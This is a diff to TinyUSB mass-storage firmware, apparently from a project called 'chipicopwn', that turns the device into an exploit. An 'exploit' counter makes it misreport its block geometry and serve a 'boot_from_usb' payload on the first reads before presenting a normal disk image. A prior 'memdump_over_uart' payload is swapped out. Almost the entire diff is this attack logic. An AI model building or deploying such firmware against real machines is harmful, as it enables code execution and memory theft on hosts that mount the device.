@@ -25,18 +25,19 @@
 
 #include "bsp/board.h"
 #include "tusb.h"
+#include "chipicopwn-disk.h"
+#include "../payloads/boot_from_usb.h"
 
 #if CFG_TUD_MSC
-#include "../payloads/memdump_over_uart.h"
-#define PAYLOAD_PTR memdump_over_uart_bin
-#define PAYLOAD_LEN memdump_over_uart_bin_len
 #define CFG_EXAMPLE_MSC_READONLY
 
 // whether host does safe-eject
 static bool ejected = false;
+static int exploit = 2;
 
-#define DISK_BLOCK_SIZE PAYLOAD_LEN
-#define DISK_BLOCK_NUM (PAYLOAD_LEN / DISK_BLOCK_SIZE) // 8KB is the smallest size that windows allow to mount
+#define DISK_BLOCK_SIZE 512
+#define DISK_BLOCK_NUM (chipicopwn_disk_img_len / DISK_BLOCK_SIZE) // 8KB is the smallest size that windows allow to mount
+
 
 // Invoked when received SCSI_CMD_INQUIRY
 // Application fill vendor id, product id and revision with string up to 8, 16, 4 characters respectively
@@ -74,8 +75,14 @@ void tud_msc_capacity_cb(uint8_t lun, uint32_t* block_count, uint16_t* block_siz
 {
   (void) lun;
 
+  if(exploit)
+  {
+  *block_count = DISK_BLOCK_NUM / 2;
+  *block_size  = DISK_BLOCK_SIZE * 2;
+  }else{
   *block_count = DISK_BLOCK_NUM;
   *block_size  = DISK_BLOCK_SIZE;
+  }
 }
 
 // Invoked when received Start Stop Unit command
@@ -110,8 +117,15 @@ int32_t tud_msc_read10_cb(uint8_t lun, uint32_t lba, uint32_t offset, void* buff
   // out of ramdisk
   if ( lba >= DISK_BLOCK_NUM ) return -1;
 
-  uint8_t const* addr = &PAYLOAD_PTR[lba * DISK_BLOCK_SIZE] + offset;
-  memcpy(buffer, addr, MIN(bufsize, PAYLOAD_LEN));
+  if(exploit)
+  {
+    uint8_t const* addr = &boot_from_usb_bin[lba * DISK_BLOCK_SIZE * 2] + offset;
+    memcpy(buffer, addr, MIN(bufsize, boot_from_usb_bin_len));
+    exploit--;
+  }else{
+    uint8_t const* addr = &chipicopwn_disk_img[lba * DISK_BLOCK_SIZE] + offset;
+    memcpy(buffer, addr, bufsize);
+  }
 
   return (int32_t) bufsize;
 }
@@ -137,7 +151,7 @@ int32_t tud_msc_write10_cb(uint8_t lun, uint32_t lba, uint32_t offset, uint8_t* 
   if ( lba >= DISK_BLOCK_NUM ) return -1;
 
 #ifndef CFG_EXAMPLE_MSC_READONLY
-  uint8_t* addr = msc_disk[lba] + offset;
+  uint8_t* addr = &boot_from_usb_bin[lba * DISK_BLOCK_SIZE] + offset;
   memcpy(addr, buffer, bufsize);
 #else
   (void) lba; (void) offset; (void) buffer;
